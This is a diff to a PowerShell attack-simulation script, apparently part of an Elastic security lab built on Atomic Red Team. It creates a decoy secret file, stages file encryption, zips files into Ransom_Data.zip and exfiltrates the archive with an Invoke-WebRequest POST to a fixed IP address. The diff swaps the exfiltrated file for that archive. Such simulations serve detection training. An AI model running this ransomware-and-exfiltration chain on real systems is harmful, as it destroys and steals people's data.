@@ -7,6 +7,7 @@ Invoke-AtomicTest T1091
 Start-Sleep -S 15
 
 Write-Host "[+] Creating Secret Document" -ForegroundColor Green
+New-Item -Path C:\temp -Type Directory
 echo "VTBkV2VWcFRRbWhqYlZWbldWZDRjMGxIT1cxSlJ6RTFTVWhDYUdNelRqTmlNMHByWTNsQ2JXSXpTV2RrUjJod1kzbENkRmxYVG05aFZ6VnNUM2R3UWxwSE1YQmlhbkJYWWxaYU5WcFdXazlpUm10NlUyMTRhMUpyU205WmVrNVBUVEpKZWxOdGRHcGtNamc1UTJ0V2MxbFlUakJoVjAwMldsZDRhR016VW5CWmQzQktTVWRvZG1OSFZXZGtSMmhvWkVOQ01HRkhWalZKUjFKMlNVYzFkbVJEUW0xWlYzaHpTVWRzZFVsSVVuWkpTRkp2V2xOQ00yTnRPWFZhZVVKdldWYzFhMk41UldoSlVXODk=" > C:\Users\Elastic\Documents\SecretStuff.txt
 
 Write-Host "[+] Windows Enumeration" -ForegroundColor Green
@@ -625,6 +626,7 @@ $shortcut.TargetPath = $TargetFile
 $shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
 $shortcut.Save()
 
+Start-Sleep -S 5
 
 # Encrypt files
 Write-Host "[+] Encrypting Files" -ForegroundColor Green
@@ -709,7 +711,7 @@ Compress-Archive -LiteralPath $files -DestinationPath C:\temp\Ransom_Data.zip
 
 Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
 # Exfil will fail due to IP address
-$content1 = Get-Content C:\temp\exfilFile.txt
+$content1 = Get-Content C:\temp\Ransom_Data.zip
 Invoke-WebRequest -Uri 172.31.33.46 -Method POST -Body $content1
 
 
